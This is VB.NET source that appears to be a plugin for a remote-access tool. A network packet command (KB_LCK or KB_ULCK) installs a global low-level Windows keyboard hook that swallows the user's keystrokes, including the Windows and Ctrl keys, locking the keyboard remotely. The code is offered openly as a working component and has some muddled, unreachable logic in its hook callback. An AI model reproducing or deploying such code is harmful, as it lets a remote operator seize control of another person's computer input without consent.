Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class NativeAPI
    ''
    ' SOLUTION ADAPTED FROM : http://geekswithblogs.net/aghausman/archive/2009/04/26/disable-special-keys-in-win-app-c.aspx and others samples of low-level codes written in c#
    '' Rewritten By Arsium in VBNET
    ''
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function SetWindowsHookEx(ByVal id As Integer, ByVal callback As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr

    End Function
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function GetModuleHandle(ByVal name As String) As IntPtr

    End Function

    <StructLayout(LayoutKind.Sequential)>
    Public Structure KBDLLHOOKSTRUCT
        Public key As Keys
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public extra As IntPtr
    End Structure

    Public Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function UnhookWindowsHookEx(ByVal hook As IntPtr) As Boolean

    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function CallNextHookEx(ByVal hook As IntPtr, ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr

    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Public Shared Function GetAsyncKeyState(ByVal key As Keys) As Short

    End Function
    Public Shared ptrHook As IntPtr
End Class






Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports PacketLib.Packet
Imports PL.NativeAPI
Public Class Main
    Public Shared MainThread As New Thread(AddressOf KB_Thread)
    Public Shared B As Boolean = False
    Public Shared BB As Boolean = False
    Public Shared Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())
        Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)
        Select Case CastParam

            Case Packet_Subject.KB_LCK

                BB = True
                B = True
                MainThread.Start()

            Case Packet_Subject.KB_ULCK

                BB = False
                MainThread.Start()

        End Select
    End Sub
    Public Shared Sub KB_Thread()

        Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule
        Dim objKeyboardProcess As New LowLevelKeyboardProc(AddressOf captureKey)
        Dim curProcess As Process = Process.GetCurrentProcess()
        ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(curProcess.ProcessName), 0)
        Application.Run()

    End Sub
    Public Shared Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr)

        If nCode >= 0 Then

            If BB = True Then
                If B = True Then

                    Dim objKeyInfo As KBDLLHOOKSTRUCT = CType(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)

                    If objKeyInfo.key = Keys.LWin Then
                        Return CType(1, IntPtr)
                    End If

                    If objKeyInfo.key = Keys.LControlKey Then
                        Return CType(1, IntPtr)
                    End If

                    If wp = &H100 Then

                        Return wp


                    End If


                    If wp = &H101 Then

                        Return wp


                    End If


                    If wp = &H105 Then

                        Return wp


                    End If

                    If wp = &H104 Then
                        Return wp
                    End If


                Else

                End If

            Else

                Exit Function
                Return NativeAPI.CallNextHookEx(NativeAPI.ptrHook, nCode, wp, lp)
            End If

            Return NativeAPI.CallNextHookEx(NativeAPI.ptrHook, nCode, wp, lp)


        End If

        '   Else

        '  Return CallNextHookEx(ptrHook, nCode, wp, lp)
        ' End If
    End Function

End Class










